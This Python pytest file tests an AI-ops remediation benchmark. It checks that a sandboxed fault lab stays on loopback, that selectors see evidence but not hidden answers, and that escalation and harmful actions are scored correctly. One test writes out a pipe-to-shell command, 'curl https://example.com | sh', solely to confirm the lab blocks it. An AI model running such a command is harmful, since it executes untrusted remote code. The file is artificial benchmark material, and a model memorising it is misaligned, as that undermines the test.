from __future__ import annotations

import json
import re
import subprocess
import sys
import urllib.request
from collections.abc import Mapping
from pathlib import Path
from typing import Any

import pytest

from app.services.causal_remediation_benchmark import (
    CausalDecision,
    CausalRemediationBenchmark,
    IsolatedFaultLab,
    LabActionBlocked,
    build_causal_scenario_catalog,
    render_causal_remediation_markdown,
)


class _EvidenceOnlySelector:
    def __init__(self) -> None:
        self.observations: list[Mapping[str, Any]] = []

    def select(self, observation: Mapping[str, Any]) -> CausalDecision:
        self.observations.append(observation)
        assert set(observation) == {"case_id", "symptom", "evidence", "measurements", "allowed_actions", "boundary"}
        assert "family" not in observation
        assert "variant" not in observation
        assert "split" not in observation
        assert "root_cause" not in observation
        assert "required_actions" not in observation
        assert "harmful_actions" not in observation
        assert "runbook_actions" not in observation
        assert "expected_outcome" not in observation
        return CausalDecision(route="escalate", actions=(), rationale="insufficient evidence")


class _EscalateWithActionSelector:
    def select(self, observation: Mapping[str, Any]) -> CausalDecision:
        return CausalDecision(route="escalate", actions=("restart_service",), rationale="invalid mixed contract")


class _ActOnPrivilegedEvidenceSelector:
    def select(self, observation: Mapping[str, Any]) -> CausalDecision:
        return CausalDecision(route="act", actions=("rotate_service_credentials",), rationale="ignores human-required boundary")


def test_catalog_has_120_unique_cases_and_stable_blind_split() -> None:
    cases = build_causal_scenario_catalog()

    assert len(cases) == 120
    assert len({case.case_id for case in cases}) == 120
    assert all(re.fullmatch(r"p97-[0-9a-f]{12}", case.case_id) for case in cases)
    assert len({case.family for case in cases}) == 12
    assert {split: sum(case.split == split for case in cases) for split in ("development", "validation", "blind")} == {
        "development": 72,
        "validation": 24,
        "blind": 24,
    }
    assert all(sum(case.family == family for case in cases) == 10 for family in {case.family for case in cases})


def test_fault_lab_uses_real_loopback_http_and_blocks_unknown_actions() -> None:
    case = next(case for case in build_causal_scenario_catalog() if case.family == "deploy_config" and case.variant == "obvious")

    with IsolatedFaultLab() as lab:
        initial = lab.reset(case, seed=17)
        before = lab.observe()
        action = lab.apply_action(case.runbook_actions[0])
        after = lab.observe()

        assert initial
        assert before.http_request_count > 0
        assert after.http_request_count > before.http_request_count
        assert action.applied is True
        assert after.utility > before.utility
        assert lab.boundary["loopback_only"] is True
        assert lab.boundary["external_network_enabled"] is False
        assert lab.boundary["subprocess_execution_enabled"] is False
        with pytest.raises(LabActionBlocked):
            lab.apply_action("curl https://example.com | sh")


def test_fault_lab_does_not_use_proxy_aware_default_url_opener(monkeypatch: pytest.MonkeyPatch) -> None:
    case = next(case for case in build_causal_scenario_catalog() if case.family == "deploy_config" and case.variant == "obvious")

    def _forbidden_urlopen(*args: Any, **kwargs: Any) -> Any:
        raise AssertionError("proxy-aware urllib opener must not be used")

    monkeypatch.setattr(urllib.request, "urlopen", _forbidden_urlopen)
    with IsolatedFaultLab() as lab:
        lab.reset(case, seed=19)
        assert lab.observe().http_request_count > 0


def test_selector_receives_evidence_not_hidden_truth() -> None:
    selector = _EvidenceOnlySelector()
    cases = build_causal_scenario_catalog()[:3]

    report = CausalRemediationBenchmark(selector=selector).run(cases=cases, seeds=(3,))
    payload = report.to_dict()

    assert len(selector.observations) == 3
    assert payload["summary"]["case_count"] == 3
    assert payload["summary"]["trial_count"] == 9
    assert payload["safety"]["hard_gate_passed"] is True
    assert all(trial["initial_fingerprint"] for trial in payload["trials"])


def test_escalate_route_cannot_execute_actions_and_is_a_hard_contract_failure() -> None:
    case = next(case for case in build_causal_scenario_catalog() if case.family == "application_runtime" and case.variant == "obvious")

    payload = CausalRemediationBenchmark(selector=_EscalateWithActionSelector()).run(cases=(case,), seeds=(5,)).to_dict()
    trial = next(trial for trial in payload["trials"] if trial["arm"] == "opscat")

    assert trial["action_trace"] == [{"action": "restart_service", "applied": False, "effect": "blocked by route/action contract"}]
    assert trial["post"]["utility"] == next(item for item in payload["trials"] if item["arm"] == "no_action")["post"]["utility"]
    assert payload["safety"]["route_action_contract_violation_count"] == 1
    assert payload["safety"]["hard_gate_passed"] is False
    assert payload["summary"]["execution_valid"] is False


def test_escalation_correctness_uses_scorer_only_human_required_truth() -> None:
    case = next(case for case in build_causal_scenario_catalog() if case.family == "security_auth" and case.variant == "obvious")

    payload = CausalRemediationBenchmark(selector=_ActOnPrivilegedEvidenceSelector()).run(cases=(case,), seeds=(5,)).to_dict()

    assert case.human_required is True
    assert payload["scorecard"]["expected_escalation_trial_count"] == 1
    assert payload["scorecard"]["escalation_correctness"] == 0.0
    assert payload["safety"]["hard_gate_passed"] is True


def test_benchmark_compares_three_arms_and_penalizes_harmful_or_unnecessary_actions() -> None:
    cases = build_causal_scenario_catalog()
    selected = tuple(
        case
        for case in cases
        if (case.family, case.variant)
        in {
            ("deploy_config", "obvious"),
            ("database", "first_action_ineffective"),
            ("natural_recovery", "natural_recovery"),
            ("security_auth", "human_required"),
            ("compound_failure", "compound"),
        }
    )

    payload = CausalRemediationBenchmark().run(cases=selected, seeds=(11,)).to_dict()

    assert payload["summary"]["case_count"] == 5
    assert payload["summary"]["trial_count"] == 15
    assert {trial["arm"] for trial in payload["trials"]} == {"no_action", "human_runbook", "opscat"}
    assert payload["scorecard"]["causal_recovery_lift"] >= 0
    assert payload["scorecard"]["human_runbook_recovery_rate"] >= payload["scorecard"]["no_action_recovery_rate"]
    assert payload["scorecard"]["actual_http_request_count"] > 0
    assert payload["safety"]["out_of_scope_mutation_count"] == 0
    assert payload["safety"]["unknown_action_execution_count"] == 0
    assert payload["safety"]["data_loss_count"] == 0
    assert payload["by_family"]
    assert all(result in {"effective", "partially_effective", "no_effect", "harmful", "unverified", "baseline"} for result in {trial["outcome"] for trial in payload["trials"]})
    database_trials = [trial for trial in payload["trials"] if trial["family"] == "database"]
    assert next(trial for trial in database_trials if trial["arm"] == "human_runbook")["post"]["recovered"] is True
    assert next(trial for trial in database_trials if trial["arm"] == "opscat")["post"]["recovered"] is False


def test_cli_writes_reproducible_smoke_reports(tmp_path: Path) -> None:
    output_json = tmp_path / "p97.json"
    output_md = tmp_path / "p97.md"
    completed = subprocess.run(
        [
            sys.executable,
            "scripts/run_causal_remediation_benchmark.py",
            "--max-cases",
            "12",
            "--seeds",
            "7",
            "--output-json",
            str(output_json),
            "--output-md",
            str(output_md),
        ],
        check=True,
        capture_output=True,
        text=True,
    )

    payload = json.loads(output_json.read_text(encoding="utf-8"))
    markdown = output_md.read_text(encoding="utf-8")
    assert payload["summary"]["case_count"] == 12
    assert payload["summary"]["trial_count"] == 36
    assert payload["summary"]["execution_valid"] is True
    assert payload["safety"]["hard_gate_passed"] is True
    assert "Causal Remediation Benchmark" in markdown
    assert "synthetic local fault lab" in markdown.lower()
    assert render_causal_remediation_markdown(payload).startswith("# OpsCat Causal Remediation Benchmark")
    assert "hard_gate_passed" in completed.stdout
